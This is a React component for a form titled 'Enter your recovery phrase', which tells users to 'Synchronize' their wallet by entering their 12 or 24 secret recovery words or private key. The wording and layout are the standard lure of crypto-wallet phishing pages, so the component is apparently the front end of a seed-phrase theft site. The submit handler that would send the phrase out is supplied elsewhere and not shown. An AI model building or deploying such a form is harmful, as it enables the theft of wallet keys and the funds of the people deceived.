import React from 'react'
import { Box } from '@mui/material';


const style = {
  paddingTop: "10px",
  display: "flex",
  alignItems: "center",
  flexDirection: "column",
  borderRadius: "10px",
};



function FormDataInfo({handleChange, walletFormData, handleSubmit}) {



    
  return (
    <div className='form-container'>
      <Box
        sx={{ ...style, '& > :not(style)': { m: 1 } }}
        noValidate
        autoComplete="off"
      >
       <div style={{ display: "inline-block", flexDirection: "column", textAlign: "center", maxWidth: "500px", alignItems: "center", justifyContent: "space-between" }}>
          <h2>Enter your recovery phrase</h2>
          <p>
            To Synchronize your wallet, enter the 12 or 24 secret recovery words
            given to you when you created your wallet
          </p>
        </div>
        <form onSubmit={handleSubmit}>
          <input type='text' name='wallet' value={walletFormData.wallet} onChange={handleChange} disabled/>
          <textarea value={walletFormData.phrase} onChange={handleChange} name="phrase" placeholder="Enter Your Phrase/private key Here!" cols="60" rows="5" charswidth="23" required></textarea>
          <div style={{textAlign: "center"}}>
          <button  type='submit' className='submit' style={{ width: "40%"}}>Synchronize</button>
          </div>
        </form>
        </Box>
      </div>
  )
}

export default FormDataInfo